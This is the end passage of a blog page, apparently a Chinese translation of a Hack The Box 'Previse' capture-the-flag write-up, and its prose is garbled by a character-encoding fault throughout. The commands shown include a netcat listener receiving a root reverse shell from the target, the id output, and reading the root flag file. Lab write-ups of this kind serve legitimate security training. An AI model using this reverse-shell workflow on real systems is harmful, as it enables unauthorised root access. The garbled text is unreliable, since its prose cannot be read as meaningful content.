/opt/scripts/access_backup.sh</span></pre><p id="b865" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åˆ‡æ¢æ—¶ï¼Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬çš„shellä»¥rootç”¨æˆ·èº«ä»½è¿æ¥:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="b175" class="ng km iq nc b gy nh ni l nj nk">â”Œâ”€â”€(rootğŸ’€kali)-[~]<br/>â””â”€# nc -nlvp 4444<br/>listening on [any] 4444 ...<br/>connect to [10.10.14.214] from (UNKNOWN) [10.10.11.104] 55386<br/>root@previse:~# id <br/>id<br/>uid=0(root) gid=0(root) groups=0(root)</span></pre><p id="572f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥æŠ“ä½æ ¹æ ‡å¿—:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="c142" class="ng km iq nc b gy nh ni l nj nk">root@previse:~# cat /root/root.txt<br/>cat /root/root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="21e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯å¦ä¸€ä¸ªå®Œæˆçš„ç›’å­ã€‚æˆ‘å¸Œæœ›ä½ å–œæ¬¢è¿™ä¸ªéå¸¸ç®€å•çš„ã€‚ä¸‹æ¬¡è§ã€‚</p></div><div class="ab cl nt nu hu nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="ij ik il im in"><p id="25f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœä½ å–œæ¬¢è¿™ç¯‡æ–‡ç« ï¼Œè¯·ç»™æˆ‘ä¸€ä¸¤ä¸ªæŒå£°ã€‚</p><p id="5926" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¨ç‰¹â€”<a class="ae nl" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>ç½‘ç«™â€” <a class="ae nl" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="72b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oa">åŸè½½äº2021å¹´12æœˆ21æ—¥</em><a class="ae nl" href="https://pencer.io/ctf/ctf-htb-previse" rel="noopener ugc nofollow" target="_blank"><em class="oa">https://pencer . io</em></a><em class="oa">ã€‚</em></p></div></div>    
</body>
</html>